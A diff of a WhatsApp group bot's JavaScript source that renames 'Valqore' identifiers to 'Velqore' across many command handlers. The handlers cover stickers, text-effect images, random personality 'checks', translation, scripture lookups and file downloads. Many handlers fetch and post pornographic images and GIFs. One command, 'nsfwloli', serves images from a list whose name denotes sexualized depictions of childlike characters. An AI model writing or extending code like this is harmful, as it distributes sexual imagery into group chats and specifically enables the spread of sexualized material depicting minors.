+                VelqoreInc.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}` }, { quoted: m })
             }
             break
 case 'trap' :
-if (!m.isGroup) return ValqoreStickGroup()
-if (!AntiNsfw) return replygcValqore(mess.nsfw)
-await ValqoreStickWait()
+if (!m.isGroup) return VelqoreStickGroup()
+if (!AntiNsfw) return replygcVelqore(mess.nsfw)
+await VelqoreStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
 break
 case 'hentai-neko' :
 case 'hneko' :
-if (!m.isGroup) return ValqoreStickGroup()
-if (!AntiNsfw) return replygcValqore(mess.nsfw)
+if (!m.isGroup) return VelqoreStickGroup()
+if (!AntiNsfw) return replygcVelqore(mess.nsfw)
     waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
 break
 case 'hentai-waifu' :
 case 'nwaifu' :
-if (!m.isGroup) return ValqoreStickGroup()
-if (!AntiNsfw) return replygcValqore(mess.nsfw)
-await ValqoreStickWait()
+if (!m.isGroup) return VelqoreStickGroup()
+if (!AntiNsfw) return replygcVelqore(mess.nsfw)
+await VelqoreStickWait()
     waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
 break
 case 'gasm':
-if (!m.isGroup) return ValqoreStickGroup()
-	if (!AntiNsfw) return replygcValqore(mess.nsfw)
-await ValqoreStickWait()						
+if (!m.isGroup) return VelqoreStickGroup()
+	if (!AntiNsfw) return replygcVelqore(mess.nsfw)
+await VelqoreStickWait()						
  waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
 break  
 case 'milf':
-if (!m.isGroup) return ValqoreStickGroup()
-await ValqoreStickWait()
+if (!m.isGroup) return VelqoreStickGroup()
+await VelqoreStickWait()
 var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/milf.json'))
-var Valqoreyresult = pickRandom(ahegaonsfw)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: Valqoreyresult.url } }, { quoted: m })
+var Velqoreyresult = pickRandom(ahegaonsfw)
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: Velqoreyresult.url } }, { quoted: m })
 break 
 case 'animespank':
-if (!m.isGroup) return ValqoreStickGroup()
-if (!AntiNsfw) return replygcValqore(mess.nsfw)
-await ValqoreStickWait()
+if (!m.isGroup) return VelqoreStickGroup()
+if (!AntiNsfw) return replygcVelqore(mess.nsfw)
+await VelqoreStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
-            await ValqoreInc.sendMessage(m.chat, { caption:  `Here you go!`, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
+            await VelqoreInc.sendMessage(m.chat, { caption:  `Here you go!`, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
 case 'blowjob':
-if (!m.isGroup) return ValqoreStickGroup()
-	if (!AntiNsfw) return replygcValqore(mess.nsfw)
-await ValqoreStickWait()
+if (!m.isGroup) return VelqoreStickGroup()
+	if (!AntiNsfw) return replygcVelqore(mess.nsfw)
+await VelqoreStickWait()
 var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/blowjob.json'))
-var Valqoreyresult = pickRandom(ahegaonsfw)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: Valqoreyresult.url } }, { quoted: m })
+var Velqoreyresult = pickRandom(ahegaonsfw)
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: Velqoreyresult.url } }, { quoted: m })
 break
 case 'cuckold':
-if (!m.isGroup) return ValqoreStickGroup()
-	if (!AntiNsfw) return replygcValqore(mess.nsfw)
-await ValqoreStickWait()
+if (!m.isGroup) return VelqoreStickGroup()
+	if (!AntiNsfw) return replygcVelqore(mess.nsfw)
+await VelqoreStickWait()
 var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/cuckold.json'))
-var Valqoreyresult = pickRandom(ahegaonsfw)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: Valqoreyresult.url } }, { quoted: m })
+var Velqoreyresult = pickRandom(ahegaonsfw)
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: Velqoreyresult.url } }, { quoted: m })
 break
 case 'eba':
-if (!m.isGroup) return ValqoreStickGroup()
-	if (!AntiNsfw) return replygcValqore(mess.nsfw)
-await ValqoreStickWait()
+if (!m.isGroup) return VelqoreStickGroup()
+	if (!AntiNsfw) return replygcVelqore(mess.nsfw)
+await VelqoreStickWait()
 var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/eba.json'))
-var Valqoreyresult = pickRandom(ahegaonsfw)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: Valqoreyresult.url } }, { quoted: m })
+var Velqoreyresult = pickRandom(ahegaonsfw)
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: Velqoreyresult.url } }, { quoted: m })
 break
 case 'gangbang':
-if (!m.isGroup) return ValqoreStickGroup()
-	if (!AntiNsfw) return replygcValqore(mess.nsfw)
-await ValqoreStickWait()
+if (!m.isGroup) return VelqoreStickGroup()
+	if (!AntiNsfw) return replygcVelqore(mess.nsfw)
+await VelqoreStickWait()
 var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/gangbang.json'))
-var Valqoreyresult = pickRandom(ahegaonsfw)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: Valqoreyresult.url } }, { quoted: m })
+var Velqoreyresult = pickRandom(ahegaonsfw)
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: Velqoreyresult.url } }, { quoted: m })
 break
 case 'nsfwloli':
-if (!m.isGroup) return ValqoreStickGroup()
-	if (!AntiNsfw) return replygcValqore(mess.nsfw)
-await ValqoreStickWait()
+if (!m.isGroup) return VelqoreStickGroup()
+	if (!AntiNsfw) return replygcVelqore(mess.nsfw)
+await VelqoreStickWait()
 var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/nsfwloli.json'))
-var Valqoreyresult = pickRandom(ahegaonsfw)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: Valqoreyresult.url } }, { quoted: m })
+var Velqoreyresult = pickRandom(ahegaonsfw)
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: Velqoreyresult.url } }, { quoted: m })
 break
 case 'pussy':
-if (!m.isGroup) return ValqoreStickGroup()
-	if (!AntiNsfw) return replygcValqore(mess.nsfw)
-await ValqoreStickWait()
+if (!m.isGroup) return VelqoreStickGroup()
+	if (!AntiNsfw) return replygcVelqore(mess.nsfw)
+await VelqoreStickWait()
 var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/pussy.json'))
-var Valqoreyresult = pickRandom(ahegaonsfw)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: Valqoreyresult.url } }, { quoted: m })
+var Velqoreyresult = pickRandom(ahegaonsfw)
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: Velqoreyresult.url } }, { quoted: m })
 break
 case 'yuri':
-if (!m.isGroup) return ValqoreStickGroup()
-	if (!AntiNsfw) return replygcValqore(mess.nsfw)
-await ValqoreStickWait()
+if (!m.isGroup) return VelqoreStickGroup()
+	if (!AntiNsfw) return replygcVelqore(mess.nsfw)
+await VelqoreStickWait()
 var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/yuri.json'))
-var Valqoreyresult = pickRandom(ahegaonsfw)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: Valqoreyresult.url } }, { quoted: m })
+var Velqoreyresult = pickRandom(ahegaonsfw)
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: Velqoreyresult.url } }, { quoted: m })
 break
 case 'zettai':
-if (!m.isGroup) return ValqoreStickGroup()
-	if (!AntiNsfw) return replygcValqore(mess.nsfw)
-await ValqoreStickWait()
+if (!m.isGroup) return VelqoreStickGroup()
+	if (!AntiNsfw) return replygcVelqore(mess.nsfw)
+await VelqoreStickWait()
 var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/zettai.json'))
-var Valqoreyresult = pickRandom(ahegaonsfw)
-ValqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: Valqoreyresult.url } }, { quoted: m })
+var Velqoreyresult = pickRandom(ahegaonsfw)
+VelqoreInc.sendMessage(m.chat, { caption: mess.success, image: { url: Velqoreyresult.url } }, { quoted: m })
 break
 case 'gifblowjob':
-if (!m.isGroup) return ValqoreStickGroup()
-if (!AntiNsfw) return replygcValqore(mess.nsfw)
-await ValqoreStickWait()
+if (!m.isGroup) return VelqoreStickGroup()
+if (!AntiNsfw) return replygcVelqore(mess.nsfw)
+await VelqoreStickWait()
   let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
     var bobuff = await fetchBuffer(assss.data.url)
     var bogif = await buffergif(bobuff)
-    await ValqoreInc.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
+    await VelqoreInc.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
     })
     break
 case 'gifhentai':
-if (!m.isGroup) return ValqoreStickGroup()
-if (!AntiNsfw) return replygcValqore(mess.nsfw)
-await ValqoreStickWait()
+if (!m.isGroup) return VelqoreStickGroup()
+if (!AntiNsfw) return replygcVelqore(mess.nsfw)
+await VelqoreStickWait()
 var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/gifs.json'))
-var Valqoreyresultx = pickRandom(ahegaonsfw)
-    await ValqoreInc.sendMessage(m.chat,{video:Valqoreyresultx, gifPlayback:true },{quoted:m}).catch(err => {
+var Velqoreyresultx = pickRandom(ahegaonsfw)
+    await VelqoreInc.sendMessage(m.chat,{video:Velqoreyresultx, gifPlayback:true },{quoted:m}).catch(err => {
     })
     break
 case 'checkme':
@@ -5961,30 +5957,30 @@ case 'checkme':
 
 *≡═══《 CHECK PROPERTIES 》═══≡*`
 					try {
-ppuser = await ValqoreInc.profilePictureUrl(m.sender, 'image')
+ppuser = await VelqoreInc.profilePictureUrl(m.sender, 'image')
 } catch (err) {
 ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
 }
-ppValqore = await getBuffer(ppuser)
-ValqoreInc.sendMessage(from, { image: ppValqore, caption: profile, mentions: [bet]},{quoted:m})
+ppVelqore = await getBuffer(ppuser)
+VelqoreInc.sendMessage(from, { image: ppVelqore, caption: profile, mentions: [bet]},{quoted:m})
 break
 case 'handsomecheck':
-				if (!text) return replygcValqore(`Tag Someone, Example : ${prefix + command} @Valqore`)
+				if (!text) return replygcVelqore(`Tag Someone, Example : ${prefix + command} @Velqore`)
 					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
 					const teng = gan[Math.floor(Math.random() * gan.length)]
-ValqoreInc.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*` }, { quoted: m })
+VelqoreInc.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*` }, { quoted: m })
 					break
 case 'beautifulcheck':
-				if (!text) return replygcValqore(`Tag Someone, Example : ${prefix + command} @Valqore`)
+				if (!text) return replygcVelqore(`Tag Someone, Example : ${prefix + command} @Velqore`)
 					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
 					const tik = can[Math.floor(Math.random() * can.length)]
-ValqoreInc.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nAnswer : *${tik}%*` }, { quoted: m })
+VelqoreInc.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nAnswer : *${tik}%*` }, { quoted: m })
 					break
 					case 'charactercheck':
-					if (!text) return replygcValqore(`Tag Someone, Example : ${prefix + command} @Valqore`)
-					const Valqorey =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
-					const taky = Valqorey[Math.floor(Math.random() * Valqorey.length)]
-					ValqoreInc.sendMessage(from, { text: `Character Check : ${q}\nAnswer : *${taky}*` }, { quoted: m })
+					if (!text) return replygcVelqore(`Tag Someone, Example : ${prefix + command} @Velqore`)
+					const Velqorey =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
+					const taky = Velqorey[Math.floor(Math.random() * Velqorey.length)]
+					VelqoreInc.sendMessage(from, { text: `Character Check : ${q}\nAnswer : *${taky}*` }, { quoted: m })
 				     break
 case 'awesomecheck':
   case 'greatcheck':
@@ -5996,69 +5992,69 @@ case 'awesomecheck':
                  case 'prettycheck':
                     case 'lovelycheck':
                       case 'uglycheck':
-if (!m.isGroup) return ValqoreStickGroup()
+if (!m.isGroup) return VelqoreStickGroup()
 const cex = body.slice(0)
 const cek1 = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
 const cek2 = cek1[Math.floor(Math.random() * cek1.length)]
 if (mentionByReply) {
-ValqoreInc.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByReply.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByReply] }, { quoted: m })
+VelqoreInc.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByReply.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByReply] }, { quoted: m })
 } else if (mentionByTag[0] && isGroup) {
-ValqoreInc.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByTag[0].split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByTag[0]] }, { quoted: m })
+VelqoreInc.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByTag[0].split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByTag[0]] }, { quoted: m })
 } else if (!mentionByReply && !mentionByTag[0]) {
-ValqoreInc.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${sender.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [sender] }, { quoted: m })
+VelqoreInc.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${sender.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [sender] }, { quoted: m })
 }
 break
 case 'patrick':
 case 'patricksticker': {
-var ano = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/main/patrick')
+var ano = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/main/patrick')
 var wifegerak = ano.split('\n')
 var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
-encmedia = await ValqoreInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
+encmedia = await VelqoreInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
 }
 break
 case 'dogesticker':
 case 'dogestick':
 	case 'doge':{
-var ano = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/main/doge')
+var ano = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/main/doge')
 var wifegerak = ano.split('\n')
 var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
-encmedia = await ValqoreInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
+encmedia = await VelqoreInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
 }
 break
 case 'lovesticker':
 case 'lovestick' :{
-var ano = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/main/love')
+var ano = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/main/love')
 var wifegerak = ano.split('\n')
 var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
-encmedia = await ValqoreInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
+encmedia = await VelqoreInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
 
 }
 break
 case 'gura':
 case 'gurastick':{
-var ano = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/main/gura')
+var ano = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/main/gura')
 var wifegerak = ano.split('\n')
 var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
-encmedia = await ValqoreInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
+encmedia = await VelqoreInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
 
 }
 break
 case 'telestick': {
-	if (m.isGroup) return ValqoreStickPrivate()
+	if (m.isGroup) return VelqoreStickPrivate()
 		if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
-		let Valqoreresources = await Telesticker(args[0])
-		await replygcValqore(`Sending ${Valqoreresources.length} stickers...`)
-		if (m.isGroup && Valqoreresources.length > 30) {
-			await replygcValqore('Number of stickers more than 30, bot will send it in private chat.')
-			for (let i = 0; i < Valqoreresources.length; i++) {
-				ValqoreInc.sendMessage(m.sender, { sticker: { url: Valqoreresources[i].url }})
+		let Velqoreresources = await Telesticker(args[0])
+		await replygcVelqore(`Sending ${Velqoreresources.length} stickers...`)
+		if (m.isGroup && Velqoreresources.length > 30) {
+			await replygcVelqore('Number of stickers more than 30, bot will send it in private chat.')
+			for (let i = 0; i < Velqoreresources.length; i++) {
+				VelqoreInc.sendMessage(m.sender, { sticker: { url: Velqoreresources[i].url }})
 			}
 		} else {
-			for (let i = 0; i < Valqoreresources.length; i++) {
-				ValqoreInc.sendMessage(m.chat, { sticker: { url: Valqoreresources[i].url }})
+			for (let i = 0; i < Velqoreresources.length; i++) {
+				VelqoreInc.sendMessage(m.chat, { sticker: { url: Velqoreresources[i].url }})
 			}
 		}
-	} else replygcValqore(`Where is the telegram sticker link?\nExample. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
+	} else replygcVelqore(`Where is the telegram sticker link?\nExample. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
 }
 break
 case 'shadow': 
@@ -6088,8 +6084,8 @@ case 'rosestext':
 case 'naturetypography':
 case 'quotesunder':
 case 'shinetext':{
-if (!q) return replygcValqore(`Example : ${prefix+command} ValqoreInc`) 
-await ValqoreStickWait()
+if (!q) return replygcVelqore(`Example : ${prefix+command} VelqoreInc`) 
+await VelqoreStickWait()
 const photooxy = require('./lib/photooxy')
 let link
 if (/stonetext/.test(command)) link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
@@ -6120,7 +6116,7 @@ if (/metalliceffect/.test(command)) link = 'https://photooxy.com/logo-and-text-e
 if (/embroiderytext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html'
 if (/flamingtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html'
 let dehe = await photooxy.photoOxy(link, q)
-ValqoreInc.sendMessage(m.chat, { image: { url: dehe }, caption: mess.success}, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { image: { url: dehe }, caption: mess.success}, { quoted: m })
 }
 break
 case 'glitchtext':
@@ -6154,8 +6150,8 @@ case 'freecreate':
 case 'galaxystyle':
 case 'lighteffects':{
 
-if (!q) return replygcValqore(`Example : ${prefix+command} ValqoreInc`) 
-await ValqoreStickWait()
+if (!q) return replygcVelqore(`Example : ${prefix+command} VelqoreInc`) 
+await VelqoreStickWait()
 let link
 if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
 if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
@@ -6188,15 +6184,15 @@ if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3
 if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
 if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
 let haldwhd = await ephoto(link, q)
-ValqoreInc.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
+VelqoreInc.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
 }
 break
 case 'setcmd': {
-                if (!m.quoted) return replygcValqore('Reply Message!')
-                if (!m.quoted.fileSha256) return replygcValqore('SHA256 Hash Missing')
-                if (!text) return replygcValqore(`For What Command?`)
+                if (!m.quoted) return replygcVelqore('Reply Message!')
+                if (!m.quoted.fileSha256) return replygcVelqore('SHA256 Hash Missing')
+                if (!text) return replygcVelqore(`For What Command?`)
                 let hash = m.quoted.fileSha256.toString('base64')
-                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return replygcValqore('You have no permission to change this sticker command')
+                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return replygcVelqore('You have no permission to change this sticker command')
                 global.db.data.sticker[hash] = {
                     text,
                     mentionedJid: m.mentionedJid,
@@ -6204,15 +6200,15 @@ case 'setcmd': {
                     at: + new Date,
                     locked: false,
                 }
-                replygcValqore(`Done!`)
+                replygcVelqore(`Done!`)
             }
             break
 case 'delcmd': {
                 let hash = m.quoted.fileSha256.toString('base64')
-                if (!hash) return replygcValqore(`No hashes`)
-                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return replygcValqore('You have no permission to delete this sticker command')             
+                if (!hash) return replygcVelqore(`No hashes`)
+                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return replygcVelqore('You have no permission to delete this sticker command')             
                 delete global.db.data.sticker[hash]
-                replygcValqore(`Done!`)
+                replygcVelqore(`Done!`)
             }
             break
 case 'listcmd': {
@@ -6221,24 +6217,24 @@ case 'listcmd': {
 Info: *bold* hash is Locked
 ${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
 `.trim()
-                ValqoreInc.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
+                VelqoreInc.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
             }
             break 
 case 'lockcmd': {
-                if (!ValqoreTheCreator) return ValqoreStickOwner()
-                if (!m.quoted) return replygcValqore('Reply Message!')
-                if (!m.quoted.fileSha256) return replygcValqore('SHA256 Hash Missing')
+                if (!VelqoreTheCreator) return VelqoreStickOwner()
+                if (!m.quoted) return replygcVelqore('Reply Message!')
+                if (!m.quoted.fileSha256) return replygcVelqore('SHA256 Hash Missing')
                 let hash = m.quoted.fileSha256.toString('base64')
-                if (!(hash in global.db.data.sticker)) return replygcValqore('Hash not found in database')
+                if (!(hash in global.db.data.sticker)) return replygcVelqore('Hash not found in database')
                 global.db.data.sticker[hash].locked = !/^un/i.test(command)
-                replygcValqore('Done!')
+                replygcVelqore('Done!')
             }
             break
             case 'ss': case 'ssweb': {
-if (!q) return replygcValqore(`Example ${prefix+command} link`)
-await ValqoreStickWait()
+if (!q) return replygcVelqore(`Example ${prefix+command} link`)
+await VelqoreStickWait()
 let krt = await scp2.ssweb(q)
-ValqoreInc.sendMessage(from,{image:krt.result,caption:mess.succes}, {quoted:m})
+VelqoreInc.sendMessage(from,{image:krt.result,caption:mess.succes}, {quoted:m})
 }
 break
 case 'pickupline': {
@@ -6249,7 +6245,7 @@ try {
     }
     let json = await res.json()
     let pickupLine = `*Here's a pickup line for you:*\n\n${json.pickupline}`
-    replygcValqore(pickupLine)
+    replygcVelqore(pickupLine)
   } catch (error) {
     console.error(error)
     // Handle the error appropriately
@@ -6263,7 +6259,7 @@ try {
     const json = await res.json()
     const { sentence, character, anime } = json
     const message = `${themeemoji}Quote\n${sentence}\n\n${themeemoji}Character: \`\`\`${character}\`\`\`\n${themeemoji}Anime: \`\`\`${anime}\`\`\`\n`
-    ValqoreInc.sendMessage(m.chat, { text: message }, 'extendedTextMessage', { quoted: m })
+    VelqoreInc.sendMessage(m.chat, { text: message }, 'extendedTextMessage', { quoted: m })
   } catch (error) {
     console.error(error)
   }
@@ -6297,31 +6293,31 @@ Number of verses: ${chapterData.verses.length}\n
 ${translatedChapterEnglish.text}\n
 🔮 *Chapter Content (Hindi):*\n
 ${translatedChapterHindi.text}`
-    replygcValqore(bibleChapter)
+    replygcVelqore(bibleChapter)
   } catch (error) {
-    replygcValqore(`Error: ${error.message}`)
+    replygcVelqore(`Error: ${error.message}`)
   }
   }
   break
   case 'dalle': {
-  if (!text) return replygcValqore(`*This command generates images from text prompts*\n\n*𝙴xample usage*\n*${prefix + command} Beautiful anime girl*\n*${prefix + command} girl in pink dress*`)
+  if (!text) return replygcVelqore(`*This command generates images from text prompts*\n\n*𝙴xample usage*\n*${prefix + command} Beautiful anime girl*\n*${prefix + command} girl in pink dress*`)
   try {
-  	replygcValqore('*Please wait, generating image...*')
+  	replygcVelqore('*Please wait, generating image...*')
     const endpoint = `https://cute-tan-gorilla-yoke.cyclic.app/imagine?text=${encodeURIComponent(text)}`
     const response = await fetch(endpoint)
     if (response.ok) {
       const imageBuffer = await response.buffer()
-      await ValqoreInc.sendMessage(m.chat, { image: imageBuffer }, {quoted: m})
+      await VelqoreInc.sendMessage(m.chat, { image: imageBuffer }, {quoted: m})
     } else {
       throw '*Image generation failed*';
     }
   } catch {
-    replygcValqore('*Oops! Something went wrong while generating images. Please try again later.*')
+    replygcVelqore('*Oops! Something went wrong while generating images. Please try again later.*')
   }
   }
   break
   case 'translate':{
-  	if (!q) return replygcValqore(`*Where is the text*\n\n*𝙴xample usage*\n*${prefix + command} <language id> <text>*\n*${prefix + command} ja yo wassup*`)
+  	if (!q) return replygcVelqore(`*Where is the text*\n\n*𝙴xample usage*\n*${prefix + command} <language id> <text>*\n*${prefix + command} ja yo wassup*`)
   	const defaultLang = 'en'
 const tld = 'cn'
     let err = `
@@ -6342,9 +6338,9 @@ https://cloud.google.com/translate/docs/languages
     if (!text && m.quoted && m.quoted.text) text = m.quoted.text
     try {
        let result = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null) 
-       replygcValqore(result.text)
+       replygcVelqore(result.text)
     } catch (e) {
-        return replygcValqore(err)
+        return replygcVelqore(err)
     } 
     }
     break
@@ -6389,19 +6385,19 @@ ${translatedTafsirUrdu.text}\n
 🔮 *Explanation (English):*\n
 ${translatedTafsirEnglish.text}`
 
-    replygcValqore(quranSurah)
+    replygcVelqore(quranSurah)
 
     if (json.data.recitation.full) {
-      ValqoreInc.sendMessage(m.chat, { audio: {url: json.data.recitation.full}, mimetype: 'audio/mp4', ptt: true, fileName: `recitation.mp3`, }, {quoted: m})
+      VelqoreInc.sendMessage(m.chat, { audio: {url: json.data.recitation.full}, mimetype: 'audio/mp4', ptt: true, fileName: `recitation.mp3`, }, {quoted: m})
     }
   } catch (error) {
-    replygcValqore(`Error: ${error.message}`)
+    replygcVelqore(`Error: ${error.message}`)
   }
   }
   break
   case 'mediafire': {
-  	if (!args[0]) return replygcValqore(`Enter the mediafire link next to the command`)
-    if (!args[0].match(/mediafire/gi)) return replygcValqore(`Link incorrect`)
+  	if (!args[0]) return replygcVelqore(`Enter the mediafire link next to the command`)
+    if (!args[0].match(/mediafire/gi)) return replygcVelqore(`Link incorrect`)
     const { mediafiredl } = require('@bochilteam/scraper')
     let full = /f$/i.test(command)
     let u = /https?:\/\//.test(args[0]) ? args[0] : 'https://' + args[0]
@@ -6415,11 +6411,11 @@ ${translatedTafsirEnglish.text}`
